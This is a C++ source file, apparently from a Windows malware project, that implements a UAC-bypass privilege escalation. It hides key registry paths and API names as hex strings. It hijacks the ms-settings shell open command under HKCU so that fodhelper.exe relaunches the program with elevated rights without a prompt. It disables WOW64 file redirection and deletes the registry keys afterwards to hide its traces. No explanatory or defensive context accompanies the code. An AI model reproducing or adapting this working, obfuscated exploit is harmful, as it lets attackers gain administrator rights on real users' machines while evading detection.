#include "Elevate.h"


bool Elevate::RegDelnodeRecurse(HKEY hKeyRoot, LPTSTR lpSubKey)
{
	LPTSTR lpEnd;
	LONG lResult;
	DWORD dwSize;
	TCHAR szName[MAX_PATH];
	HKEY hKey;
	FILETIME ftWrite;
	lResult = RegDeleteKey(hKeyRoot, lpSubKey);
	if (lResult == ERROR_SUCCESS)
		return true;
	lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
	if (lResult != ERROR_SUCCESS)
	{
		if (lResult == ERROR_FILE_NOT_FOUND) {
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
			return true;
		}
		else {
#ifdef _DEBUG
			Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
			return false;
		}
	}
	lpEnd = lpSubKey + lstrlen(lpSubKey);
	if (*(lpEnd - 1) != TEXT('\\'))
	{
		*lpEnd = TEXT('\\');
		lpEnd++;
		*lpEnd = TEXT('\0');
	}
	dwSize = MAX_PATH;
	lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
		NULL, NULL, &ftWrite);
	if (lResult == ERROR_SUCCESS)
	{
		do {
			*lpEnd = TEXT('\0');
			StringCchCat(lpSubKey, MAX_PATH * 2, szName);
			if (!RegDelnodeRecurse(hKeyRoot, lpSubKey)) {
				break;
			}
			dwSize = MAX_PATH;
			lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
				NULL, NULL, &ftWrite);
		} while (lResult == ERROR_SUCCESS);
	}
	lpEnd--;
	*lpEnd = TEXT('\0');
	RegCloseKey(hKey);
	lResult = RegDeleteKey(hKeyRoot, lpSubKey);
	if (lResult == ERROR_SUCCESS)
		return true;
	return false;
}

bool Elevate::RegDelnode(HKEY hKeyRoot, LPCTSTR lpSubKey)
{
	TCHAR szDelKey[MAX_PATH * 2];
	StringCchCopy(szDelKey, MAX_PATH * 2, lpSubKey);
	return RegDelnodeRecurse(hKeyRoot, szDelKey);
}


void Elevate::DisableWow64Redirect(void)
{
	PVOID pDummy = NULL;
	typedef bool(WINAPI* fn_t)(PVOID*);
	string var =Encryptions::hexToAscii("576f77363444697361626c65576f77363446735265646972656374696f6e");
	fn_t fn = (fn_t)GetProcAddress(LoadLibraryA(Encryptions::hexToAscii("6b65726e656c3332").c_str()), var.c_str());
	if (fn) {
		fn(&pDummy);
	}
}

void Elevate::GoHigherExecute()
{
	DisableWow64Redirect();
	char filename[200];
	GetModuleFileNameA(NULL, filename, sizeof(filename));
	LPCTSTR data = (LPCTSTR)filename;
	HKEY NewVal;
	HKEY hkey;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	bool bSuccess;
	char szTmp[999] = { 0 };
	bool ret = false;
	char szSysPath[MAX_PATH] = { 0 };
	memset(&si, 0, sizeof(si)); si.cb = sizeof(si);
	string var =Encryptions::hexToAscii("536f6674776172655c5c436c61737365735c5c6d732d73657474696e67735c5c5368656c6c5c5c4f70656e5c5c636f6d6d616e64");
	if (RegCreateKeyEx(HKEY_CURRENT_USER, Utils::s2ws(var).c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hkey, NULL) != ERROR_SUCCESS)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	RegCloseKey(hkey);
	var =Encryptions::hexToAscii("536f6674776172655c5c436c61737365735c5c6d732d73657474696e67735c5c5368656c6c5c5c4f70656e5c5c636f6d6d616e64");
	if (RegOpenKey(HKEY_CURRENT_USER, Utils::s2ws(var).c_str(), &NewVal) != ERROR_SUCCESS)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		RegCloseKey(NewVal);
		return;
	}
	if (RegSetValueEx(NewVal, TEXT("DelegateExecute"), 0, REG_SZ, (BYTE*)"", 0) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	if (RegSetValueA(NewVal, NULL, REG_SZ, (LPCSTR)data, ((DWORD)strlen((char*)data) * sizeof(TCHAR))) != ERROR_SUCCESS)
	{
		RegCloseKey(NewVal);
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		return;
	}
	si.cb = sizeof(si);
	GetSystemDirectoryA(szSysPath, MAX_PATH);
	string d =Encryptions::hexToAscii("433a5c5c57494e444f57535c5c73797374656d33325c5c636d642e657865202f6320433a5c5c57494e444f57535c5c73797374656d33325c5c666f6468656c7065722e657865");
	char cstr[500];
	d.copy(cstr, d.size() + 1);
	cstr[d.size()] = '\0';
	ret = CreateProcessA(NULL, cstr, NULL, NULL, false, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
	if (ret != 0)
	{
#ifdef _DEBUG
		Utils::ErrorHandeling(string(__FUNCTION__) + "-" + to_string(__LINE__));
#endif
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		return;
	}
	Sleep(6000);
	var =Encryptions::hexToAscii("536f6674776172655c5c436c61737365735c5c6d732d73657474696e6773");
	bSuccess = RegDelnode(HKEY_CURRENT_USER, Utils::s2ws(var).c_str());
	RegCloseKey(NewVal);
}
